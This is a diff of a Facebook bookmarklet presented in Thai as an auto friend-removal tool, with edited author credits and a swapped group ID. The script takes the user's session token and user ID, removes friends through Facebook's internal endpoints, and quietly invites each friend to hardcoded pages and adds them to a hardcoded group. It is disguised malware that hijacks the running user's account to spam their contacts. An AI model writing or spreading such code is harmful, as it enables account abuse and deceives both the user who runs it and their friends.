@@ -1,6 +1,6 @@
 javascript: var Title = "[ลบเพื่อนออโต้]</A>";
 var Descriptions = "",
-    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://error404-pro.tk" target="_blank">[ลบเพื่อนออนโต้]</A>.</A>';
+    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank">Error404-Pro.Tk</A> & <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank"> Error404-Pro Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank"> SlowHacker Edit</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank">Test3/A></A>.</br>Test4<A style="color:#3B5998;" href="http://error404-pro.tk" target="_blank">[ลบเพื่อนออนโต้]</A>.</A>';
 
 function InviteFriends(opo) {
     jx.load(window.location.protocol + "//www.facebook.com/ajax/profile/removefriendconfirm.php?uid=" + opo + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function (a) {
@@ -58,7 +58,7 @@ function InviteFriends(opo) {
     if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=167113693488785&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
     if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=396978267081247&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
 
-    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=100006619800809&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
+    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=431994330234615&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
 
 }
 jx = {
